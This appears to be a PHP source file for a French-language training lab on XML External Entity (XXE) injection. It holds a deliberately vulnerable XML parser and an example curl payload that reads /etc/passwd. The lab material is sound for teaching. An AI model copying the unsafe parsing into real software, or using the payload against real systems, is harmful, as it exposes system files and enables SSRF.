<?php
// CSS intégré
$PAGE_STYLE = '
<style>
    body { font-family: "Arial", sans-serif; background-color: #f4f4f9; color: #333; margin: 20px; }
    h1 { color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
    h2, h3 { color: #34495e; }
    form { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); margin-bottom: 20px; }
    textarea { width: 100%; height: 150px; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
    input[type="submit"] { background-color: #3498db; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
    .vulnerability-note { background-color: #e74c3c; color: white; padding: 10px; border-radius: 4px; text-align: center; margin-bottom: 15px; }
    pre { background: #ecf0f1; border: 1px solid #bdc3c7; padding: 15px; border-radius: 4px; overflow-x: auto; white-space: pre-wrap; }
</style>
';

$output = "Aucune requête XML reçue.";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $xml_data = file_get_contents('php://input');
    
    // ⚠️ VULNÉRABILITÉ XXE ⚠️ : Libxml est utilisé sans désactiver les entités externes.
    // Libxml par défaut dans cette version permet le chargement des entités externes.
    $doc = new DOMDocument();
    
    // Suppression des messages d'erreur du parseur pour un affichage plus propre
    libxml_use_internal_errors(true); 
    
    if ($doc->loadXML($xml_data)) {
        $result = $doc->getElementsByTagName('comment')->item(0)->nodeValue ?? 'N/A';
        $output = "Commentaire traité : " . htmlspecialchars($result);
    } else {
        $output = "Erreur de parsing XML: " . print_r(libxml_get_errors(), true);
    }
}

$default_xml = '<comment><user>Attaquant</user><comment>Test de commentaire simple</comment></comment>';

?>
<!DOCTYPE html>
<html>
<head>
    <title>XXE Injection Lab</title>
    <?php echo $PAGE_STYLE; ?>
</head>
<body>
    <div class="vulnerability-note">VULNÉRABILITÉ: XML External Entity (XXE) Injection - Port 8091</div>
    <h1>Lab XXE - Traitement de Données XML</h1>

    <p><strong>Cible:</strong> Injecter une entité externe pour lire le contenu de <code>/etc/passwd</code> (XXE classique) ou effectuer un SSRF.</p>

    <hr>

    <h2>Envoyer des Données XML (Utiliser cURL ou Burp Suite)</h2>
    <p>Cette API attend une requête POST avec <code>Content-Type: application/xml</code>.</p>
    
    <form method="POST" action="index.php">
        <label for="xml_input">XML à Envoyer :</label>
        <textarea name="xml_input" readonly><?php echo htmlspecialchars($default_xml); ?></textarea>
        <br><br>
        <input type="submit" value="Simuler l'Envoi (Utilisez cURL)">
    </form>
    
    <h3>Résultat du Traitement XML</h3>
    <pre><?php echo htmlspecialchars($output); ?></pre>
    
    <h3>Exemple cURL pour l'Attaque</h3>
    <pre>
curl -X POST http://localhost:8091/ \\
-H "Content-Type: application/xml" \\
-d '&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt; ]&gt;&lt;comment&gt;&lt;user&gt;&xxe;&lt;/user&gt;&lt;comment&gt;XXE Test&lt;/comment&gt;&lt;/comment&gt;'
    </pre>

</body>
</html>
